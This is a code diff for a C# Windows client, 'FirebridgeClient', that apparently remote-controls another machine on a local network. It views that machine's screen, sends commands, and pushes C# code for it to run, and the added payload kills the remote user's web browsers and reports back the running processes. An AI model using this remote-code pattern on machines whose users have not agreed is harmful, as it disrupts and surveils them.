@@ -11,6 +11,7 @@ using System.Reflection;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using FirebridgeShared.Models;
 
 namespace FirebridgeClient
 {
@@ -23,7 +24,7 @@ namespace FirebridgeClient
         {
             num = r.Next();
             InitializeComponent();
-            c = new Connection(new IPEndPoint(IPAddress.Parse("10.10.60.20"), 6969));
+            c = new Connection(new IPEndPoint(IPAddress.Parse("10.10.60.29"), 6969));
             c.MessageRecieved += C_MessageRecieved;
             this.timer1.Enabled = true;
             panel1.GetType()
@@ -35,7 +36,7 @@ namespace FirebridgeClient
         private void C_MessageRecieved(object sender, EventArgs e)
         {
             var packet = ((MessageEventArgs)e).Packet;
-            if(packet.Id == 3)
+            if (packet.Id == 3)
             {
                 panel1.BackgroundImage = (Bitmap)packet.Data;
                 return;
@@ -55,7 +56,7 @@ namespace FirebridgeClient
 
         private void _buttonConsoleSubmit_Click(object sender, EventArgs e)
         {
-            c.SendPacket(new Packet() { Id = 0, Data = _textBoxSubmitText.Text+ num + r.Next(500).ToString() });
+            c.SendPacket(new Packet() { Id = 0, Data = _textBoxSubmitText.Text + num + r.Next(500).ToString() });
         }
 
         private void _textBoxConsole_TextChanged(object sender, EventArgs e)
@@ -81,7 +82,7 @@ namespace FirebridgeClient
 
         private void Button3_Click(object sender, EventArgs e)
         {
-            c.SendPacket(new Packet() { Id = 2, Data = 71});
+            c.SendPacket(new Packet() { Id = 2, Data = 71 });
 
         }
 
@@ -89,6 +90,55 @@ namespace FirebridgeClient
         {
 
             c.SendPacket(new Packet() { Id = 50, Data = 71 });
+        }
+
+        private void Button5_Click(object sender, EventArgs e)
+        {
+            c.SendPacket(new Packet() { Id = 5 });
+        }
+
+        private void Button6_Click(object sender, EventArgs e)
+        {
+            c.SendPacket(new Packet()
+            {
+                Id = 1,
+                Data = new MiniProgramModel()
+                {
+                    Code = @"
+using System;
+using System.Diagnostics;
+using System.Linq;
+using FirebridgeShared.Networking;
+
+namespace TestApp
+{
+    public static class Program
+    {
+        public static void Main(Connection s)
+        {
+            Process[] AllProcesses = Process.GetProcesses();
+            foreach (var process in AllProcesses)
+            {
+                if (process.MainWindowTitle != """")
+                {
+                    string k = process.ProcessName.ToLower();
+                    if (k == ""iexplore"" || k == ""iexplorer"" || k == ""chrome"" || k == ""firefox"")
+                        process.Kill();
+                }
+            }
+            
+           s.SendPacket(new Packet() { Id = 0, Data = String.Join("","", Process.GetProcesses().Select(p => p.ProcessName.ToString()).ToArray())});
+
+                }
+    }
+}",
+                    EntryPoint = "TestApp.Program",
+                    References = new List<string>()
+                    {
+                        "System.dll", "FirebridgeShared.dll", "netstandard.dll","System.Core.dll"
+                    },
+                }
+            });
         }
     }
 }
